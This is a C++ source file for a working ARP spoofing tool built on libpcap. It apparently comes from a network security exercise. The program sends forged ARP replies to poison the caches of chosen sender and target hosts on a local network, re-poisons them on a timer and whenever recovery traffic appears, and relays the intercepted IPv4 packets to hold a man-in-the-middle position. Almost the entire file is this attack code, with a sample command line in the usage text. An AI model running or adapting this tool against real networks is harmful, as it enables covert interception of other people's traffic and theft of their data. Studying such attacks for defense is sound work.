#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct {
		Mac sender_mac;
		Mac target_mac;
		Ip sender_ip;
		Ip target_ip;
}Flow;

struct Args {
	pcap_t* handle;
	EthArpPacket *packet;
	Flow *flow;
	Mac mm; 
	int cnt;
};

typedef struct{
	uint8_t v_N_len;
	uint8_t tos;
	uint16_t t_Len;
	uint16_t id;
	uint16_t frag_Off;
	uint8_t ttl;
	uint8_t protocol;
	uint16_t hd_Chksum;
	uint32_t src_Addr;
	uint32_t dst_Addr;
}ip_header;

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void make_packet(EthArpPacket *packet, Mac dmac, Mac smac, Mac sm, Ip sip, Mac tm, Ip tip, int request) {
	packet->eth_.dmac_ = dmac;
	packet->eth_.smac_ = smac;
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	if(request) packet->arp_.op_ = htons(ArpHdr::Request);
	else packet->arp_.op_ = htons(ArpHdr::Reply);
	packet->arp_.smac_ = sm;
	packet->arp_.sip_ = htonl(Ip(sip));
	packet->arp_.tmac_ = tm;
	packet->arp_.tip_ = htonl(Ip(tip));
}

int send_packet(pcap_t* handle, EthArpPacket* packet, int size) {
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), size);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return 0;
	}
	return 1;
}

void wait_packet(pcap_t* handle, Mac *mac_addr, Mac sm, Ip si, Mac tm, Ip ti) {
	struct pcap_pkthdr* header;
	const u_char* packet;
	while(1) {
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return;
		}
		EthArpPacket* catched_packet = (EthArpPacket*)packet;
		if(ntohs(catched_packet->eth_.type_) != EthHdr::Arp) continue;
		if(ntohs(catched_packet->arp_.op_) != ArpHdr::Reply) continue;
		if(ntohl(catched_packet->arp_.sip_) != si) continue;	
		if(ntohl(catched_packet->arp_.tip_) != ti) continue;
		if(catched_packet->arp_.tmac_ != tm) continue;
		*mac_addr = Mac(catched_packet->arp_.smac_); 
		break;
	}
}

void get_mac_addr(pcap_t* handle, EthArpPacket *packet, Mac *sm, Ip si, Mac mm, Ip mi) {
	Mac NULL_MAC;
	make_packet(packet, Mac("FF:FF:FF:FF:FF:FF"), mm, mm, mi, Mac("00:00:00:00:00:00"), si, 1);
	send_packet(handle, packet, sizeof(EthArpPacket));
	wait_packet(handle, sm, NULL_MAC , si, mm, mi);
}

int arp_cache_poisoning(pcap_t* handle, EthArpPacket *packet, Flow *flow, Mac mm) {
	make_packet(packet, flow->sender_mac, mm, mm, flow->target_ip, flow->sender_mac, flow->sender_ip, 0);
	return send_packet(handle, packet, sizeof(EthArpPacket));
}


int check_arp_recover(pcap_t* handle, EthArpPacket *packet , Flow *flow, Mac mm, int cnt) {
	for(int i=0; i<=cnt; i++) {
		if((ntohl(packet->arp_.sip_) == flow[i].sender_ip) && (ntohl(packet->arp_.tip_) == flow[i].target_ip) || (ntohl(packet->arp_.sip_) == flow[i].target_ip) && (ntohl(packet->arp_.tip_) == flow[i].sender_ip)) {
			
			for(int j=0; j<5; j++) {
				if(!(arp_cache_poisoning(handle, packet, &(flow[i]), mm))) return 0;
			}
		}
	}
	return 1;
}

int relay_packet(pcap_t* handle, pcap_pkthdr* header, EthArpPacket *packet , Flow *flow, Mac mm, Ip mi, int cnt) {	
	for(int i=0; i<=cnt; i++) {
		ip_header *IpHdr =  (ip_header *)((uint8_t *)packet + sizeof(EthHdr));
		if(((ntohl(IpHdr->src_Addr) == flow[i].sender_ip) && (ntohl(IpHdr->dst_Addr) != mi)) || ((ntohl(IpHdr->src_Addr) != flow[i].sender_ip) && (ntohl(IpHdr->dst_Addr) == flow[i].target_ip))) {
			packet->eth_.dmac_ = flow[i].target_mac;
			packet->eth_.smac_ = mm;
		}
		else continue;
		if(!(send_packet(handle, packet, sizeof(EthHdr) + ntohs(IpHdr->t_Len)))) return 0;
	}
	return 1;
}

int arp_spoofing(pcap_t* handle, Flow *flow, Mac mm, Ip mi, int cnt) {
	struct pcap_pkthdr* header;
	const u_char* pkt;
	while(1) {
		int res = pcap_next_ex(handle, &header, &pkt);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return 0;
		}
		EthArpPacket* packet = (EthArpPacket*)pkt;
		if(ntohs(packet->eth_.type_) == EthHdr::Arp) {
			return check_arp_recover(handle, packet, flow, mm, cnt);
		}
		else if(packet->eth_.dmac_ == mm && (ntohs(packet->eth_.type_) == EthHdr::Ip4)){
			return relay_packet(handle, header, packet, flow, mm, mi, cnt);
		}
	}
}

void *send_arp_with_interval(void * p) {
	Args *args = (Args *)p;
	while(1) {
		for(int i=0; i<=args->cnt; i++) arp_cache_poisoning(args->handle, args->packet, &(args->flow[i]), args->mm);
		sleep(15);
	}
}

//Reference : https://pencil1031.tistory.com/66

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <unistd.h>

int getIPAddress(Ip *ip_addr, char* dev) {
	int sock;
	struct ifreq ifr;
	struct sockaddr_in *sin;
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		return 0;
	}
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	*ip_addr = htonl(Ip(sin->sin_addr.s_addr));
	close(sock);
	return 1;
}

int getMacAddress(Mac *mac_addr, char* dev) {
	int sock;
	struct ifreq ifr;	
	char mac_adr[18] = {0,};		
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {		
		return 0;
	}	
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	*mac_addr = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
	close(sock);
	return 1;
}

int main(int argc, char* argv[]) {
	if (argc == 2 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;
	
	Mac *NULL_MAC;
	Mac my_mac;
	Ip my_ip;
	
	Flow flow[1000];
	
	int cnt;
	
	getIPAddress(&my_ip, dev);
	getMacAddress(&my_mac, dev);
		
	for(int i=2; i<argc; i+=2) {
		cnt = (i-2) / 2;
		
		flow[cnt].sender_ip = Ip((argv[i]));
		flow[cnt].target_ip = Ip((argv[i + 1]));
		
		printf("\nSENDER IP : %s\tTARGET IP : %s\n", std::string(flow[cnt].sender_ip).c_str(), std::string(flow[cnt].target_ip).c_str());
		
		get_mac_addr(handle, &packet, &(flow[cnt].sender_mac), flow[cnt].sender_ip, my_mac, my_ip);
		get_mac_addr(handle, &packet, &(flow[cnt].target_mac), flow[cnt].target_ip, my_mac, my_ip);
		arp_cache_poisoning(handle, &packet, &(flow[cnt]), my_mac);
		
		printf("ARP CACHE POISONING COMPLETE\n");
		
	}
	pthread_t thread;
	Args args = {handle, &packet, flow, my_mac, cnt};
	if(!(pthread_create(&thread, NULL, send_arp_with_interval, (void *)(&args)))) {
		printf("\nARP SPOOFING IS ACTIVATED ...\n");
		while(1) {
			if(arp_spoofing(handle, flow, my_mac, my_ip, cnt)) continue;
			printf("ERROR OCCURED\n");
			break;
		}
	}
	else printf("ERROR OCCURED\n");
	return 0;

}
